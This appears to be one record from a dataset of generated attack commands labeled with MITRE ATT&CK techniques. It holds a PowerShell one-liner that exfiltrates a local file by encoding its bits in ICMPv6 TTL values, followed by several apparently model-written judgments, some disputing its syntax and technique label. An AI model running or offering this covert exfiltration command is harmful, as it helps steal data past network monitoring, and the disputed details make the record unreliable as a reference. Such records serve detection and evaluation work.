command: $d='fd00:0:0:1::7'; $bytes=[IO.File]::ReadAllBytes('C:\Users\Public\report.bin'); foreach($b in $bytes){ ([Convert]::ToString($b,2).PadLeft(8,'0')).ToCharArray() | ForEach-Object { $ttl = if($_ -eq '1'){61}else{113}; Test-Connection -ComputerName $d -Count 1 -TimeToLive $ttl -IPv6 -Quiet | Out-Null } }
explanation: Encodes bits of each byte into the Time To Live (TTL) of ICMPv6 echo requests, using ICMP as an alternate network medium per T1011.
rationale_steps: Convert each byte to an 8-bit binary string.
Map bit values to distinct TTLs to represent 0/1.
Transmit ICMPv6 echos with selected TTLs to a ULA destination.

llm_judgments.syntactic_justification: The PowerShell one-liner is well-formed with balanced quotes/braces, proper separators, and valid parameter syntax, so it will parse correctly.
llm_judgments.semantic_justification: It plausibly exfiltrates data by encoding bits in ICMPv6 hop-limit/TTL values, but this is an alternative protocol channel rather than a different network medium (e.g., cellular, Wi-Fi, Bluetooth) as defined by T1011.

llm_judgments.syntactic_justification: The PowerShell command is well-formed with balanced quotes, braces, and parentheses, proper use of semicolons, pipeline operators, and valid .NET method calls throughout.
llm_judgments.semantic_justification: The command correctly implements a covert TTL-based bit-encoding exfiltration channel over ICMPv6 to an IPv6 address, which aligns well with T1011's concept of using an alternate network medium; however, Test-Connection's -TimeToLive parameter may not reliably set the TTL on outgoing packets in all Windows/PowerShell versions, and the receiver-side infrastructure to decode TTL values is not addressed, slightly reducing operational plausibility.

llm_judgments.syntactic_justification: The command is perfectly well-formed PowerShell code with balanced parentheses, braces, and quotes, and follows standard pipelining and variable assignment rules.
llm_judgments.semantic_justification: The command fails semantically for two reasons: 1) the 'Test-Connection' cmdlet does not have a '-TimeToLive' parameter in any standard PowerShell version (it is '-MaxHops' in PowerShell 7+ and unsupported in 5.1), and 2) the command is misclassified as T1011 (Other Network Medium) when it actually describes T1048 (Alternative Protocol), as ICMP is a protocol, not a physical network medium.
